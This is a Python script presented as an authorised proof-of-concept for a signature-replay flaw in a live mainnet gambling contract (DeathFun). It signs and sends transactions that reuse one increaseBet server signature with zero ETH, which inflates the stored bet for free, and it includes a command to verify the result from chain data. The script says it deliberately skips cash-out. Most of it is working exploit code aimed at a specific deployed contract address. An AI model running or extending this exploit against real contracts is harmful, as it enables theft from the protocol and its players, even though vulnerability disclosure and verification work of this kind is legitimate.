#!/usr/bin/env python3
"""
death.fun F01 — authorised live on-chain demonstration.

Purpose: demonstrate, on the LIVE DeathFun contract, that one valid `increaseBet`
server-signature can be submitted repeatedly with no ETH attached after the first,
inflating `game.betAmount` for free.

This script deliberately DOES NOT cash out. It stops with the inflated bet sitting
in contract storage. No money leaves the protocol: the only ETH the demo wallet
spends is its own stake plus gas.

Usage
-----
  # 0. read-only preflight (safe, sends nothing)
  python3 replay_demo.py preflight --key ~/.keys/df-test.key

  # 1. create the game (needs a createGame note from the team)
  python3 replay_demo.py create --key ~/.keys/df-test.key \
      --note note-create.json --preliminary-id demo-001 --stake-eth 0.001

  # 2. the replay itself (needs an increaseBet note from the team)
  python3 replay_demo.py replay --key ~/.keys/df-test.key \
      --note note-increase.json --repeats 5

  # 3. independent verification — a third party can run this with no key at all
  #    and confirm the claim from public chain data only
  python3 replay_demo.py verify --game-id 12345 --wallet 0xYourTestWallet \
      --txs 0xaaa...,0xbbb...,0xccc...

Note file formats are documented in NOTE-FORMAT.md.
"""

import argparse
import json
import os
import sys
import time
import urllib.request
from decimal import Decimal

RPC = os.environ.get("DF_RPC", "https://api.mainnet.abs.xyz/")
CONTRACT = "0x27EDd16eE56958fddCBA08947f12C43DDeC2B20C"
CHAIN_ID = 2741

# ---------------------------------------------------------------- rpc helpers


def rpc(method, params, timeout=40):
    body = json.dumps({"jsonrpc": "2.0", "method": method, "params": params, "id": 1}).encode()
    req = urllib.request.Request(
        RPC, data=body, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    )
    for attempt in range(3):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                out = json.load(r)
            if "error" in out:
                raise RuntimeError(out["error"])
            return out["result"]
        except Exception as e:
            if attempt == 2:
                raise
            time.sleep(2 * (attempt + 1))


def keccak(data: bytes) -> bytes:
    from Crypto.Hash import keccak as _k

    h = _k.new(digest_bits=256)
    h.update(data)
    return h.digest()


def selector(sig: str) -> str:
    return "0x" + keccak(sig.encode()).hex()[:8]


def enc_uint(v: int) -> str:
    return f"{v:064x}"


def enc_bytes(b: bytes) -> str:
    """ABI-encode a dynamic bytes value (head offset handled by caller)."""
    pad = (-len(b)) % 32
    return enc_uint(len(b)) + b.hex() + "00" * pad


def enc_string(s: str) -> str:
    return enc_bytes(s.encode())


# ---------------------------------------------------------------- calldata


def cd_increase_bet(game_id: int, amount: int, deadline: int, sig: bytes) -> str:
    """
    increaseBet(uint256 onChainGameId, uint256 amount, uint256 deadline, bytes serverSignature)

    Layout: selector | id | amount | deadline | offset(=0x80) | bytes(len+data)
    This is the whole point of the demo: there is no `msg.value` field in the signed
    hash and no nonce, so this exact calldata is replayable verbatim.
    """
    return (
        selector("increaseBet(uint256,uint256,uint256,bytes)")
        + enc_uint(game_id)
        + enc_uint(amount)
        + enc_uint(deadline)
        + enc_uint(0x80)
        + enc_bytes(sig)
    )


def cd_create_game(preliminary_id: str, seed_hash: bytes, algo: str, cfg: str,
                   deadline: int, sig: bytes) -> str:
    """
    createGame(string preliminaryGameId, bytes32 gameSeedHash, string algoVersion,
               string gameConfig, uint256 deadline, bytes serverSignature)
    """
    head = enc_uint(0xA0) + seed_hash.hex() + enc_uint(0x100) + enc_uint(0x120) + enc_uint(deadline)
    tail = enc_string(preliminary_id) + enc_string(algo) + enc_string(cfg) + enc_bytes(sig)
    return selector("createGame(string,bytes32,string,string,uint256,bytes)") + head + tail


# ---------------------------------------------------------------- chain reads


def call(to, data):
    return rpc("eth_call", [{"to": to, "data": data}, "latest"])


def balance_wei(addr: str) -> int:
    return int(rpc("eth_getBalance", [addr, "latest"]), 16)


def game_state(game_id: int) -> dict:
    """
    Read games(id) (the public auto-getter) and decode it.

    Layout note (verified empirically against the GameCreated event, which carries the
    player and betAmount as an independent oracle): the returndata begins with a single
    leading offset word (0x20) and the struct tuple then starts at byte 32. Dynamic-member
    offsets inside the tuple are relative to that tuple start, NOT to byte 0 — getting this
    wrong silently yields a plausible-looking but wrong player/betAmount, so the head is
    indexed from word 1 and all dynamic offsets get `BASE` added.
    """
    raw = call(CONTRACT, selector("games(uint256)") + enc_uint(game_id))
    if not isinstance(raw, str) or not raw.startswith("0x"):
        raise RuntimeError(f"games({game_id}) call failed: {raw}")
    return _decode_game_struct(bytes.fromhex(raw[2:]))


def game_state_full(game_id: int) -> dict:
    """
    getGameDetails(id) — same struct, same layout rules as games(id).
    Raises GameDoesNotExist if the id is unused (the contract reverts with that selector).
    """
    raw = call(CONTRACT, selector("getGameDetails(uint256)") + enc_uint(game_id))
    if not isinstance(raw, str) or not raw.startswith("0x"):
        raise RuntimeError(f"getGameDetails({game_id}) reverted: {raw}")
    return _decode_game_struct(bytes.fromhex(raw[2:]))


BASE = 32  # the struct tuple starts one word in; see layout note above


def _decode_game_struct(b: bytes) -> dict:
    n = len(b) // 32
    words = [b[i * 32:(i + 1) * 32] for i in range(n)]

    def u(i):
        return int.from_bytes(words[i], "big")

    def dyn(i):
        """i = word index of the offset; offset is relative to BASE."""
        off = u(i)
        if off == 0:
            return ""
        pos = BASE + off
        if pos // 32 >= n:
            return ""
        ln = int.from_bytes(b[pos:pos + 32], "big")
        return b[pos + 32:pos + 32 + ln].decode("utf-8", "replace")

    return {
        "createdAt": u(1),
        "player": "0x" + words[2][12:].hex(),
        "betAmount_wei": u(3),
        "status": u(4),                 # 0 = Active, 1 = Won, 2 = Lost
        "payoutAmount_wei": u(5),
        "gameSeedHash": "0x" + words[6].hex(),
        "gameSeed": dyn(7),
        "algoVersion": dyn(8),
        "gameConfig": dyn(9),
        "gameState": dyn(10),
    }


# ---------------------------------------------------------------- sending


def sign_and_send(pk_hex: str, to: str, data: str, value_wei: int, gas_limit: int):
    from eth_account import Account

    acct = Account.from_key(pk_hex)
    tx = {
        "chainId": CHAIN_ID,
        "nonce": int(rpc("eth_getTransactionCount", [acct.address, "pending"]), 16),
        "to": to,
        "value": value_wei,
        "data": data,
        "gas": gas_limit,
        "maxFeePerGas": int(rpc("eth_gasPrice", []), 16) * 2,
        "maxPriorityFeePerGas": int(rpc("eth_gasPrice", []), 16),
        "type": 2,
    }
    signed = acct.sign_transaction(tx)
    raw = signed.raw_transaction.hex()
    if not raw.startswith("0x"):
        raw = "0x" + raw
    return acct.address, rpc("eth_sendRawTransaction", [raw])


def wait_receipt(tx_hash: str, timeout=180):
    deadline = time.time() + timeout
    while time.time() < deadline:
        r = rpc("eth_getTransactionReceipt", [tx_hash])
        if r:
            return r
        time.sleep(3)
    return None


# ---------------------------------------------------------------- commands


def cmd_preflight(a):
    from eth_account import Account

    acct = Account.from_key(a.key)
    print(f"demo wallet      : {acct.address}")
    bal = balance_wei(acct.address)
    print(f"balance          : {bal / 1e18:.6f} ETH  ({bal} wei)")
    print(f"nonce            : {int(rpc('eth_getTransactionCount', [acct.address, 'latest']), 16)}")
    print(f"chain id         : {int(rpc('eth_chainId', []), 16)}")
    impl = rpc("eth_getStorageAt", [
        CONTRACT, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc", "latest"])
    print(f"contract         : {CONTRACT}")
    print(f"impl (EIP-1967)  : 0x{impl[-40:]}")
    print(f"gameCounter      : {int(call(CONTRACT, selector('gameCounter()')), 16)}")
    print(f"messagePrefix    : {decode_string(call(CONTRACT, selector('messagePrefix()')))}")
    if bal < 10**15:
        print("\n!! balance below 0.001 ETH — fund before running the demo")
        return 1
    print("\npreflight OK — no transaction sent")
    return 0


def decode_string(raw: str) -> str:
    b = bytes.fromhex(raw[2:])
    if len(b) < 64:
        return ""
    off = int.from_bytes(b[:32], "big")
    ln = int.from_bytes(b[off:off + 32], "big")
    return b[off + 32:off + 32 + ln].decode("utf-8", "replace")


def cmd_create(a):
    note = json.load(open(a.note))
    stake = int(Decimal(str(a.stake_eth)) * 10**18)
    data = cd_create_game(
        a.preliminary_id,
        bytes.fromhex(note["gameSeedHash"][2:]),
        note["algoVersion"],
        note["gameConfig"],
        int(note["deadline"]),
        bytes.fromhex(note["serverSignature"][2:]),
    )
    if a.dry_run:
        print("calldata:", data)
        return 0
    addr, tx = sign_and_send(a.key, CONTRACT, data, stake, a.gas)
    print(f"createGame sent : {tx}")
    print(f"  from {addr}  stake {stake / 1e18} ETH")
    rc = wait_receipt(tx)
    print("  status:", "OK" if rc and rc.get("status") == "0x1" else f"FAILED {rc}")
    if rc and rc.get("status") == "0x1":
        for log in rc["logs"]:
            if log["topics"][0] == "0x" + keccak(
                b"GameCreated(string,uint256,address,uint256,bytes32)").hex():
                gid = int(log["topics"][1], 16)
                print(f"  onChainGameId = {gid}")
                json.dump({"gameId": gid, "tx": tx, "player": addr},
                          open("demo-receipt-create.json", "w"), indent=2)
    return 0


def cmd_replay(a):
    note = json.load(open(a.note))
    gid = int(note["onChainGameId"])
    amount = int(note["amount"])
    deadline = int(note["deadline"])
    sig = bytes.fromhex(note["serverSignature"][2:])

    from eth_account import Account
    acct = Account.from_key(a.key)

    st = game_state_full(gid)
    if st["player"].lower() != acct.address.lower():
        print(f"!! game {gid} belongs to {st['player']}, not our wallet {acct.address}")
        print("   increaseBet requires game.player == msg.sender")
        return 1
    if st["status"] != 0:
        print(f"!! game {gid} status is {st['status']} (not Active=0)")

    before = st["betAmount_wei"]
    bal_before = balance_wei(acct.address)
    now = int(time.time())
    print(f"game            : {gid}")
    print(f"player          : {st['player']}")
    print(f"betAmount before: {before / 1e18:.9f} ETH")
    print(f"note amount     : {amount / 1e18:.9f} ETH")
    print(f"deadline        : {deadline}  ({'live, ' + str(deadline - now) + 's left' if deadline > now else 'EXPIRED'})")
    print(f"repeats         : {a.repeats}   (msg.value = 0 on every one)")
    print()

    txs = []
    for i in range(a.repeats):
        data = cd_increase_bet(gid, amount, deadline, sig)
        addr, tx = sign_and_send(a.key, CONTRACT, data, 0, a.gas)  # <-- value 0
        print(f"  [{i+1}/{a.repeats}] eth_sendRawTransaction -> {tx}")
        rc = wait_receipt(tx)
        ok = rc and rc.get("status") == "0x1"
        print(f"        status={'OK (accepted)' if ok else 'FAILED'}"
              f"  gasUsed={int(rc['gasUsed'], 16) if rc else '-'}")
        if not ok:
            print(f"        receipt: {json.dumps(rc)[:300] if rc else 'no receipt'}")
            break
        txs.append(tx)
        bump = game_state_full(gid)["betAmount_wei"]
        print(f"        contract betAmount is now {bump / 1e18:.9f} ETH"
              f"  (+{(bump - before) / 1e18:.9f} from {(i+1) * amount / 1e18:.9f} of notes)")
        time.sleep(2)

    after = game_state_full(gid)["betAmount_wei"]
    bal_after = balance_wei(acct.address)
    gas_spent = bal_before - bal_after

    print()
    print("=" * 72)
    print("RESULT")
    print("=" * 72)
    print(f"  betAmount before        : {before / 1e18:.9f} ETH")
    print(f"  betAmount after         : {after / 1e18:.9f} ETH")
    print(f"  credited without payment: {(after - before) / 1e18:.9f} ETH")
    print(f"  ETH actually staked     : {a.repeats * amount / 1e18:.9f} ETH worth of notes"
          f" -> but msg.value sent: 0 ETH")
    print(f"  wallet ETH spent        : {gas_spent / 1e18:.9f} ETH (gas only")
    print(f"                            = {gas_spent} wei)")
    print(f"  signature reuses        : {len(txs)}")
    print(f"  NO cash-out was performed. betAmount remains inflated in storage;")
    print(f"  no funds left the protocol.")
    print()
    for t in txs:
        print(f"  tx: {t}")

    json.dump({
        "gameId": gid, "player": acct.address, "contract": CONTRACT, "chainId": CHAIN_ID,
        "betAmount_before_wei": before, "betAmount_after_wei": after,
        "credited_without_payment_wei": after - before,
        "note_amount_wei": amount, "repeats": len(txs),
        "msg_value_on_replays_wei": 0,
        "wallet_eth_spent_wei": gas_spent, "txs": txs,
        "cashout_performed": False,
    }, open("demo-receipt-replay.json", "w"), indent=2)
    print("\nreceipt written: demo-receipt-replay.json")
    return 0


def cmd_verify(a):
    """Verify a demo from public chain data only. No key, no trust in us required."""
    st = game_state_full(int(a.game_id))
    print(f"game {a.game_id} on {CONTRACT}")
    print(f"  player           : {st['player']}")
    print(f"  betAmount        : {st['betAmount_wei'] / 1e18:.9f} ETH")
    print(f"  status           : {st['status']}  (0 = Active)")
    print(f"  ETH sent by each replay tx (tx.value):")
    total_value = 0
    for tx in [t for t in a.txs.split(",") if t]:
        t = rpc("eth_getTransactionByHash", [tx])
        if not t:
            print(f"    {tx}  NOT FOUND")
            continue
        v = int(t["value"], 16)
        total_value += v
        print(f"    {tx}  value={v} wei  to={t['to']}  from={t['from']}")
    print(f"  total ETH sent across all replay txs: {total_value} wei")
    print()
    print(f"  CLAIM: {len([t for t in a.txs.split(',') if t])} replay txs, all worth "
          f"{total_value} wei, credited {st['betAmount_wei'] / 1e18:.9f} ETH to betAmount.")
    print("  If total ETH sent is 0 while betAmount is non-zero, the finding is confirmed.")
    return 0


def main():
    p = argparse.ArgumentParser()
    sub = p.add_subparsers(dest="cmd", required=True)

    q = sub.add_parser("preflight"); q.add_argument("--key", required=True); q.set_defaults(f=cmd_preflight)
    c = sub.add_parser("create")
    c.add_argument("--key", required=True); c.add_argument("--note", required=True)
    c.add_argument("--preliminary-id", required=True); c.add_argument("--stake-eth", default="0.001")
    c.add_argument("--gas", type=int, default=900000); c.add_argument("--dry-run", action="store_true")
    c.set_defaults(f=cmd_create)
    r = sub.add_parser("replay")
    r.add_argument("--key", required=True); r.add_argument("--note", required=True)
    r.add_argument("--repeats", type=int, default=5); r.add_argument("--gas", type=int, default=600000)
    r.set_defaults(f=cmd_replay)
    v = sub.add_parser("verify")
    v.add_argument("--game-id", required=True); v.add_argument("--wallet", default=None)
    v.add_argument("--txs", required=True)
    v.set_defaults(f=cmd_verify)

    a = p.parse_args()
    if a.cmd in ("preflight", "create", "replay"):
        pk = open(a.key).read().strip()
        if not pk.startswith("0x"):
            pk = "0x" + pk
        a.key = pk
    sys.exit(a.f(a))


if __name__ == "__main__":
    main()
